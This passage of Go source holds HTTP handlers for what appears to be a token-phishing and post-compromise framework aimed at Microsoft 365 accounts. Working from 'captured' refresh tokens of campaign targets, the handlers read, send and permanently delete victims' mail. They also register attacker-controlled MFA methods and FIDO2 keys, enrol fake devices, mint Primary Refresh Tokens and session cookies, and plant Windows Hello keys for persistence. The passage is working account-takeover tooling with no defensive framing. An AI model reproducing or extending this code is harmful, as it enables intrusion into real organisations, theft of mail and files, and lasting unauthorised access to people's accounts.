		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetGroupAppRoles(context.Background(), r.PathValue("groupId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// --- User detail handlers ---

func (h *Handler) graphUserInfo(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetUserInfo(context.Background(), r.PathValue("userId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphUserMemberOf(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	result, err := gc.GetUserMemberOf(context.Background(), r.PathValue("userId"))
	if err != nil {
		writeError(w, 500, err.Error())
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// GenerateUserCodeCSV is kept for potential future export use.
func GenerateUserCodeCSV(w io.Writer, sessions map[string]interface{}) error {
	cw := csv.NewWriter(w)
	cw.Write([]string{"target_email", "user_code", "verification_url", "state", "expires_at"})
	for _, v := range sessions {
		_ = v
	}
	cw.Flush()
	return cw.Error()
}

// ─── Graph: M365 Search ───────────────────────────────────────────────────────

func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		Query       string   `json:"query"`
		EntityTypes []string `json:"entityTypes"`
		Top         int      `json:"top"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if len(body.EntityTypes) == 0 {
		body.EntityTypes = []string{"message", "driveItem", "site"}
	}
	result, err := gc.SearchContent(context.Background(), body.Query, body.EntityTypes, body.Top)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// ─── Graph: Drive extra ───────────────────────────────────────────────────────

func (h *Handler) graphDriveShared(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	result, err := gc.GetSharedWithMe(context.Background())
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// ─── Graph: Mail extra ───────────────────────────────────────────────────────

func (h *Handler) graphMailListAttachments(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	result, err := gc.ListMessageAttachments(context.Background(), r.PathValue("msgId"))
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphMailDownloadAttachment(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	data, ct, err := gc.DownloadMessageAttachment(context.Background(), r.PathValue("msgId"), r.PathValue("attId"))
	if err != nil { writeError(w, 500, err.Error()); return }
	if ct != "" {
		w.Header().Set("Content-Type", ct)
	}
	w.Write(data)
}

func (h *Handler) graphMailPermanentDelete(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	if err := gc.PermanentDeleteMessage(context.Background(), r.PathValue("msgId")); err != nil {
		writeError(w, 500, err.Error()); return
	}
	w.WriteHeader(204)
}

func (h *Handler) graphMailCreateDraft(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		Subject  string   `json:"subject"`
		HTMLBody string   `json:"htmlBody"`
		To       []string `json:"to"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	result, err := gc.CreateMailDraft(context.Background(), body.Subject, body.HTMLBody, body.To)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) graphMailAddAttachment(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	r.ParseMultipartForm(32 << 20)
	file, hdr, err := r.FormFile("file")
	if err != nil { writeError(w, 400, "file required"); return }
	defer file.Close()
	data, _ := io.ReadAll(file)
	ct := hdr.Header.Get("Content-Type")
	if ct == "" { ct = "application/octet-stream" }
	if err := gc.AddAttachmentToDraft(context.Background(), r.PathValue("msgId"), hdr.Filename, ct, data); err != nil {
		writeError(w, 500, err.Error()); return
	}
	w.WriteHeader(204)
}

func (h *Handler) graphMailSendDraft(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	if err := gc.SendDraft(context.Background(), r.PathValue("msgId")); err != nil {
		writeError(w, 500, err.Error()); return
	}
	w.WriteHeader(204)
}

// ─── Graph: User batch ────────────────────────────────────────────────────────

func (h *Handler) graphUserBatch(w http.ResponseWriter, r *http.Request) {
	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	result, err := gc.GetUserDetailsBatch(context.Background(), r.PathValue("userId"))
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// ─── Graph: Custom request ────────────────────────────────────────────────────

func (h *Handler) graphCustomRequest(w http.ResponseWriter, r *http.Request) {
	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		Method  string            `json:"method"`
		URI     string            `json:"uri"`
		Headers map[string]string `json:"headers"`
		Body    string            `json:"body"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid request"); return
	}
	if body.Method == "" { body.Method = "GET" }

	var reqBody io.Reader
	if body.Body != "" {
		reqBody = strings.NewReader(body.Body)
	}
	req, err := http.NewRequestWithContext(context.Background(), body.Method, body.URI, reqBody)
	if err != nil { writeError(w, 400, err.Error()); return }
	req.Header.Set("Authorization", "Bearer "+token.AccessToken)
	req.Header.Set("Accept", "application/json")
	for k, v := range body.Headers {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil { writeError(w, 502, err.Error()); return }
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
	w.WriteHeader(resp.StatusCode)
	w.Write(respBody)
}

// ─── MFA management ───────────────────────────────────────────────────────────

// isTokenExpiredErr returns true only for AADSTS codes that specifically indicate
// a revoked or expired refresh token. AADSTS70000 is intentionally excluded —
// it fires on scope/permission mismatches and does NOT mean the token is expired.
func isTokenExpiredErr(err error) bool {
	if err == nil {
		return false
	}
	s := err.Error()
	for _, code := range []string{
		"AADSTS700082", // refresh token expired due to inactivity
		"AADSTS70008",  // auth code or refresh token has expired
		"AADSTS50173",  // user changed password — all tokens invalidated
		"AADSTS50076",  // MFA required (session invalidated)
		"token_expired",
	} {
		if strings.Contains(s, code) {
			return true
		}
	}
	return false
}

// mfaFallbackClients is the ordered list of client IDs tried when exchanging a
// refresh token for the My Sign-ins resource (19db86c3-...).
// AADSTS65002 fires when two Microsoft first-party apps lack mutual
// preauthorization, so we walk this list until one succeeds.
var mfaFallbackClients = []string{
	"1b730954-1685-4b74-9bfd-dac224a7b894", // Azure PowerShell
	"04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Azure CLI
	"c44b4083-3bb0-49c1-b47d-974e53cbdf3c", // Azure Portal
	"0000000c-0000-0000-c000-000000000000", // Microsoft Security
}

func (h *Handler) mfaClient(campaignID, targetID string) (*mfapkg.Client, error) {
	token, err := h.Manager.GetTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, fmt.Errorf("no captured token for target: %w", err)
	}
	if token.RefreshToken == "" {
		return nil, fmt.Errorf("no refresh token for target %s", token.TargetEmail)
	}

	ctx := context.Background()
	// Prefer the per-token tenant ID (extracted from JWT tid claim at capture
	// time) over the campaign-level tenant ID, which may be empty or wrong.
	tenantID := token.TenantID
	if tenantID == "" {
		tenantID = h.Manager.TenantID()
	}
	if tenantID == "" {
		tenantID = "organizations"
	}

	// Fast revocation check: try a plain Graph refresh before attempting the
	// mysignins exchange. AADSTS70000 on a Graph exchange means the refresh
	// token itself is invalid/revoked (e.g. MFA enforcement just changed the
	// required claims), NOT a scope/client mismatch.
	_, graphErr := tokenexchange.Exchange(ctx, tenantID, h.Manager.ClientID(), token.RefreshToken,
		"https://graph.microsoft.com", "", true)
	if graphErr != nil && strings.Contains(graphErr.Error(), "AADSTS70000") {
		return nil, fmt.Errorf(
			"refresh token for %s has been revoked (AADSTS70000) — this typically happens when MFA is newly enforced on the tenant and the captured session lacked MFA claims. Re-capture required.",
			token.TargetEmail)
	}
	if isTokenExpiredErr(graphErr) {
		return nil, fmt.Errorf("refresh token expired or revoked for %s — re-capture required", token.TargetEmail)
	}

	// Build deduped list: campaign clientID first, then fallbacks.
	seen := map[string]bool{}
	clientIDs := []string{}
	for _, cid := range append([]string{h.Manager.ClientID()}, mfaFallbackClients...) {
		if !seen[cid] {
			seen[cid] = true
			clientIDs = append(clientIDs, cid)
		}
	}

	var lastErr error
	for _, cid := range clientIDs {
		// Try v2 without offline_access (mysignins doesn't expose that scope),
		// then v1 resource= as fallback.
		for _, tid := range []string{tenantID, "organizations"} {
			pair, err := tokenexchange.Exchange(ctx, tid, cid, token.RefreshToken,
				"", "19db86c3-b2b9-44cc-b339-36da233a3be2/.default", false)
			if err == nil {
				return mfapkg.New(pair.AccessToken), nil
			}
			if isTokenExpiredErr(err) {
				return nil, fmt.Errorf("refresh token expired or revoked for %s — re-capture required", token.TargetEmail)
			}
			pair, err = tokenexchange.Exchange(ctx, tid, cid, token.RefreshToken,
				"19db86c3-b2b9-44cc-b339-36da233a3be2", "", true)
			if err == nil {
				return mfapkg.New(pair.AccessToken), nil
			}
			if isTokenExpiredErr(err) {
				return nil, fmt.Errorf("refresh token expired or revoked for %s — re-capture required", token.TargetEmail)
			}
			lastErr = err
		}
	}
	// If the final error is still AADSTS70000 across all combinations, the
	// token is likely revoked rather than just a preauthorization gap.
	if lastErr != nil && strings.Contains(lastErr.Error(), "AADSTS70000") {
		return nil, fmt.Errorf(
			"refresh token for %s appears revoked (AADSTS70000 on all attempts) — try refreshing the token first or re-capturing after MFA login",
			token.TargetEmail)
	}
	return nil, fmt.Errorf("MFA token exchange failed — the target tenant may not have MFA/SSPR provisioned, or no client ID is preauthorized for the My Sign-ins API: %w", lastErr)
}

func (h *Handler) mfaListMethods(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	result, err := client.ListAvailableMethods(context.Background())
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaGetSession(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	ctx, err := client.GetSessionCtx(context.Background())
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(map[string]string{"sessionCtx": ctx})
}

func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		PhoneType  int    `json:"phoneType"`
		Phone      string `json:"phone"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	result, err := client.AddPhoneMethod(context.Background(), body.PhoneType, body.Phone, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaAddEmail(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		Email      string `json:"email"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	result, err := client.AddEmailMethod(context.Background(), body.Email, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		AppType    int    `json:"appType"`
		SecretKey  string `json:"secretKey"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	result, err := client.AddMobileAppMethod(context.Background(), body.AppType, body.SecretKey, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaRegisterTOTP(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		Label      string `json:"label"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	reg, err := client.RegisterAsOTPApp(context.Background(), body.Label, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	// Persist the secret
	id := fmt.Sprintf("otp-%d", time.Now().UnixNano())
	h.Store.InsertOTPSecret(store.OTPSecretRow{
		ID: id, Label: reg.Label, Secret: reg.Secret, CreatedAt: reg.CreatedAt,
	})
	json.NewEncoder(w).Encode(map[string]string{"id": id, "label": reg.Label, "secret": reg.Secret})
}

func (h *Handler) mfaVerify(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		VerificationID string `json:"verificationId"`
		Code           string `json:"code"`
		SessionCtx     string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	result, err := client.VerifyMethod(context.Background(), body.VerificationID, body.Code, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaDeleteMethod(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		MethodID   string `json:"methodId"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if err := client.DeleteMethod(context.Background(), body.MethodID, body.SessionCtx); err != nil {
		writeError(w, 500, err.Error()); return
	}
	w.WriteHeader(204)
}

func (h *Handler) mfaFIDO2Begin(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		KeyName    string `json:"keyName"`
		SessionCtx string `json:"sessionCtx"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.KeyName == "" { body.KeyName = "Security Key" }
	result, err := client.InitializeFIDO2Registration(context.Background(), body.KeyName, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		VerificationID      string          `json:"verificationId"`
		SessionCtx          string          `json:"sessionCtx"`
		AttestationResponse json.RawMessage `json:"attestationResponse"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid request body")
		return
	}
	result, err := client.CompleteFIDO2Registration(context.Background(), body.VerificationID, body.AttestationResponse, body.SessionCtx)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

// ─── Token exchange ───────────────────────────────────────────────────────────

func (h *Handler) tokenExchange(w http.ResponseWriter, r *http.Request) {
	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
	if err != nil { writeError(w, 404, err.Error()); return }
	var body struct {
		ClientID string `json:"clientId"`
		Resource string `json:"resource"`
		Scope    string `json:"scope"`
		UseV1    bool   `json:"useV1"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	// Prefer per-token tenant ID (from JWT tid claim) over campaign-level.
	tenantID := token.TenantID
	if tenantID == "" {
		tenantID = h.Manager.TenantID()
	}
	// Use the original captured client ID as default when caller didn't specify.
	if body.ClientID == "" {
		if token.CapturedClientID != "" {
			body.ClientID = token.CapturedClientID
		} else {
			body.ClientID = h.Manager.ClientID()
		}
	}

	result, err := tokenexchange.Exchange(context.Background(), tenantID, body.ClientID, token.RefreshToken, body.Resource, body.Scope, body.UseV1)

	// AADSTS65002: first-party ↔ first-party preauthorization missing.
	// Retry with known fallback client IDs.
	if err != nil && strings.Contains(err.Error(), "65002") {
		for _, cid := range mfaFallbackClients {
			if cid == body.ClientID {
				continue
			}
			result, err = tokenexchange.Exchange(context.Background(), tenantID, cid, token.RefreshToken, body.Resource, body.Scope, body.UseV1)
			if err == nil {
				break
			}
			if isTokenExpiredErr(err) {
				break
			}
		}
	}

	if err != nil {
		msg := err.Error()
		if strings.Contains(msg, "AADSTS70000") {
			msg += " — note: AADSTS70000 often means the refresh token is revoked (e.g. MFA enforcement changed required claims). Try refreshing the token from the Tokens tab or re-capturing."
		}
		writeError(w, 500, msg)
		return
	}
	json.NewEncoder(w).Encode(result)
}

// ─── Utility ─────────────────────────────────────────────────────────────────

func (h *Handler) utilTenantLookup(w http.ResponseWriter, r *http.Request) {
	var body struct{ Domain string `json:"domain"` }
	json.NewDecoder(r.Body).Decode(&body)
	tid, err := tokenexchange.LookupTenantID(context.Background(), body.Domain)
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(map[string]string{"tenantId": tid, "domain": body.Domain})
}

// ─── Device Certificates ──────────────────────────────────────────────────────

func (h *Handler) listDeviceCerts(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListDeviceCerts()
	if err != nil { writeError(w, 500, err.Error()); return }
	// Omit private keys from listing
	type safeCert struct {
		ID           string    `json:"id"`
		Label        string    `json:"label"`
		DeviceID     string    `json:"device_id"`
		JoinType     int       `json:"join_type"`
		TargetDomain string    `json:"target_domain"`
		CreatedAt    time.Time `json:"created_at"`
	}
	out := make([]safeCert, len(rows))
	for i, r := range rows {
		out[i] = safeCert{r.ID, r.Label, r.DeviceID, r.JoinType, r.TargetDomain, r.CreatedAt}
	}
	json.NewEncoder(w).Encode(out)
}

func (h *Handler) createDeviceCert(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label        string `json:"label"`
		AccessToken  string `json:"accessToken"` // token for devicereg resource
		TargetDomain string `json:"targetDomain"`
		DeviceType   string `json:"deviceType"`
		OSVersion    string `json:"osVersion"`
		JoinType     int    `json:"joinType"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.Label == "" { body.Label = "Device-" + fmt.Sprintf("%d", time.Now().Unix()) }
	cert, err := devicereg.Register(context.Background(), body.AccessToken, body.Label, body.TargetDomain, body.DeviceType, body.OSVersion, body.JoinType)
	if err != nil { writeError(w, 500, err.Error()); return }
	h.Store.InsertDeviceCert(store.DeviceCertRow{
		ID: cert.ID, Label: cert.Label, DeviceID: cert.DeviceID,
		JoinType: cert.JoinType, Certificate: cert.Certificate,
		PrivateKey: cert.PrivateKeyPEM, TargetDomain: cert.TargetDomain,
		CreatedAt: cert.CreatedAt,
	})
	json.NewEncoder(w).Encode(map[string]string{"id": cert.ID, "deviceId": cert.DeviceID, "label": cert.Label})
}

func (h *Handler) importDeviceCert(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label        string `json:"label"`
		DeviceID     string `json:"deviceId"`
		Certificate  string `json:"certificate"`
		PrivateKey   string `json:"privateKey"`
		TargetDomain string `json:"targetDomain"`
		JoinType     int    `json:"joinType"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	id := fmt.Sprintf("dc-%d", time.Now().UnixNano())
	if err := h.Store.InsertDeviceCert(store.DeviceCertRow{
		ID: id, Label: body.Label, DeviceID: body.DeviceID,
		JoinType: body.JoinType, Certificate: body.Certificate,
		PrivateKey: body.PrivateKey, TargetDomain: body.TargetDomain,
		CreatedAt: time.Now().UTC(),
	}); err != nil {
		writeError(w, 500, err.Error()); return
	}
	json.NewEncoder(w).Encode(map[string]string{"id": id})
}

func (h *Handler) deleteDeviceCert(w http.ResponseWriter, r *http.Request) {
	h.Store.DeleteDeviceCert(r.PathValue("id"))
	w.WriteHeader(204)
}

// ─── Primary Refresh Tokens ───────────────────────────────────────────────────

func (h *Handler) listPRTs(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListPRTs()
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(rows)
}

func (h *Handler) requestPRT(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label        string `json:"label"`
		DeviceCertID string `json:"deviceCertId"`
		RefreshToken string `json:"refreshToken"`
		ClientID     string `json:"clientId"`
		TargetUPN    string `json:"targetUpn"`
		TenantID     string `json:"tenantId"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.ClientID == "" {
		body.ClientID = "1950a258-227b-4e31-a9cf-717495945fc2" // Azure PowerShell
	}
	certRow, err := h.Store.GetDeviceCert(body.DeviceCertID)
	if err != nil { writeError(w, 404, "device cert not found"); return }
	dc := &devicereg.DeviceCert{
		ID: certRow.ID, Label: certRow.Label, DeviceID: certRow.DeviceID,
		JoinType: certRow.JoinType, Certificate: certRow.Certificate,
		PrivateKeyPEM: certRow.PrivateKey, TargetDomain: certRow.TargetDomain,
		CreatedAt: certRow.CreatedAt,
	}
	p, err := prtpkg.Request(context.Background(), body.RefreshToken, body.ClientID, dc)
	if err != nil { writeError(w, 500, err.Error()); return }
	p.Label = body.Label
	p.TargetUPN = body.TargetUPN
	p.TenantID = body.TenantID
	h.Store.InsertPRT(store.PRTRow{
		ID: p.ID, Label: p.Label, DeviceCertID: p.DeviceCertID,
		PRTToken: p.Token, SessionKey: p.SessionKey,
		TargetUPN: p.TargetUPN, TenantID: p.TenantID, CreatedAt: p.CreatedAt,
	})
	json.NewEncoder(w).Encode(map[string]string{"id": p.ID, "label": p.Label})
}

func (h *Handler) importPRT(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label        string `json:"label"`
		DeviceCertID string `json:"deviceCertId"`
		PRTToken     string `json:"prtToken"`
		SessionKey   string `json:"sessionKey"`
		TargetUPN    string `json:"targetUpn"`
		TenantID     string `json:"tenantId"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	id := fmt.Sprintf("prt-%d", time.Now().UnixNano())
	h.Store.InsertPRT(store.PRTRow{
		ID: id, Label: body.Label, DeviceCertID: body.DeviceCertID,
		PRTToken: body.PRTToken, SessionKey: body.SessionKey,
		TargetUPN: body.TargetUPN, TenantID: body.TenantID,
		CreatedAt: time.Now().UTC(),
	})
	json.NewEncoder(w).Encode(map[string]string{"id": id})
}

func (h *Handler) deletePRT(w http.ResponseWriter, r *http.Request) {
	h.Store.DeletePRT(r.PathValue("id"))
	w.WriteHeader(204)
}

func (h *Handler) prtToAccessToken(w http.ResponseWriter, r *http.Request) {
	row, err := h.Store.GetPRT(r.PathValue("id"))
	if err != nil { writeError(w, 404, "PRT not found"); return }
	var body struct {
		ClientID string `json:"clientId"`
		Resource string `json:"resource"`
		Scope    string `json:"scope"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	if body.ClientID == "" { body.ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c" }
	p := &prtpkg.PRT{
		ID: row.ID, Token: row.PRTToken, SessionKey: row.SessionKey,
		TargetUPN: row.TargetUPN, TenantID: row.TenantID,
	}
	result, err := prtpkg.ToAccessToken(context.Background(), p, body.ClientID, body.Resource, body.Scope)
	if err != nil { writeError(w, 500, err.Error()); return }
	w.Header().Set("Content-Type", "application/json")
	w.Write(result)
}

func (h *Handler) prtToCookie(w http.ResponseWriter, r *http.Request) {
	row, err := h.Store.GetPRT(r.PathValue("id"))
	if err != nil { writeError(w, 404, "PRT not found"); return }
	p := &prtpkg.PRT{Token: row.PRTToken, SessionKey: row.SessionKey}
	cookie, err := prtpkg.ToCookie(context.Background(), p)
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(map[string]string{"cookie": cookie, "name": "x-ms-RefreshTokenCredential"})
}

// ─── WinHello Keys ────────────────────────────────────────────────────────────

func (h *Handler) listWinHelloKeys(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListWinHelloKeys()
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(rows)
}

func (h *Handler) registerWinHelloKey(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label        string `json:"label"`
		DeviceCertID string `json:"deviceCertId"`
		AccessToken  string `json:"accessToken"` // for urn:ms-drs:enterpriseregistration.windows.net
		UserID       string `json:"userId"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	certRow, err := h.Store.GetDeviceCert(body.DeviceCertID)
	if err != nil { writeError(w, 404, "device cert not found"); return }
	dc := &devicereg.DeviceCert{
		ID: certRow.ID, DeviceID: certRow.DeviceID,
		Certificate: certRow.Certificate, PrivateKeyPEM: certRow.PrivateKey,
	}
	key, err := prtpkg.RegisterWinHello(context.Background(), body.AccessToken, dc, body.UserID, body.Label)
	if err != nil { writeError(w, 500, err.Error()); return }
	h.Store.InsertWinHelloKey(store.WinHelloKeyRow{
		ID: key.ID, Label: key.Label, DeviceCertID: key.DeviceCertID,
		KeyID: key.KeyID, PrivateKey: key.PrivateKeyPEM,
		TargetUPN: key.TargetUPN, CreatedAt: key.CreatedAt,
	})
	json.NewEncoder(w).Encode(map[string]string{"id": key.ID, "keyId": key.KeyID})
}

func (h *Handler) deleteWinHelloKey(w http.ResponseWriter, r *http.Request) {
	h.Store.DeleteWinHelloKey(r.PathValue("id"))
	w.WriteHeader(204)
}

// ─── OTP Secrets / TOTP ───────────────────────────────────────────────────────

func (h *Handler) listOTPSecrets(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListOTPSecrets()
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(rows)
}

func (h *Handler) addOTPSecret(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label  string `json:"label"`
		Secret string `json:"secret"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	id := fmt.Sprintf("otp-%d", time.Now().UnixNano())
	h.Store.InsertOTPSecret(store.OTPSecretRow{
		ID: id, Label: body.Label, Secret: body.Secret, CreatedAt: time.Now().UTC(),
	})
	json.NewEncoder(w).Encode(map[string]string{"id": id})
}

func (h *Handler) deleteOTPSecret(w http.ResponseWriter, r *http.Request) {
	h.Store.DeleteOTPSecret(r.PathValue("id"))
	w.WriteHeader(204)
}

func (h *Handler) generateOTPCode(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListOTPSecrets()
	if err != nil { writeError(w, 500, err.Error()); return }
	var secret string
	for _, row := range rows {
		if row.ID == r.PathValue("id") {
			secret = row.Secret
			break
		}
	}
	if secret == "" { writeError(w, 404, "OTP secret not found"); return }
	code, err := mfapkg.GenerateTOTP(secret)
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(map[string]string{"code": code})
}

// ─── Request Templates ────────────────────────────────────────────────────────

func (h *Handler) listRequestTemplates(w http.ResponseWriter, r *http.Request) {
	rows, err := h.Store.ListRequestTemplates()
	if err != nil { writeError(w, 500, err.Error()); return }
	json.NewEncoder(w).Encode(rows)
}

func (h *Handler) saveRequestTemplate(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Label   string `json:"label"`
		Method  string `json:"method"`
		URI     string `json:"uri"`
		Headers string `json:"headers"`
		Body    string `json:"body"`
	}
	json.NewDecoder(r.Body).Decode(&body)
	id := fmt.Sprintf("rt-%d", time.Now().UnixNano())
	h.Store.InsertRequestTemplate(store.RequestTemplateRow{
		ID: id, Label: body.Label, Method: body.Method,
		URI: body.URI, Headers: body.Headers, Body: body.Body,
		CreatedAt: time.Now().UTC(),
	})
	json.NewEncoder(w).Encode(map[string]string{"id": id})
}

func (h *Handler) deleteRequestTemplate(w http.ResponseWriter, r *http.Request) {
	h.Store.DeleteRequestTemplate(r.PathValue("id"))
	w.WriteHeader(204)
}

// ─── Per-target campaign operations ─────────────────────────────────────────

func (h *Handler) deleteTarget(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	if err := h.Manager.DeleteTarget(id, targetID); err != nil {
		writeError(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (h *Handler) launchForTarget(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	targetID := r.PathValue("targetId")
	if err := h.Manager.LaunchForTarget(id, targetID); err != nil {
		writeError(w, 400, err.Error())
		return
	}
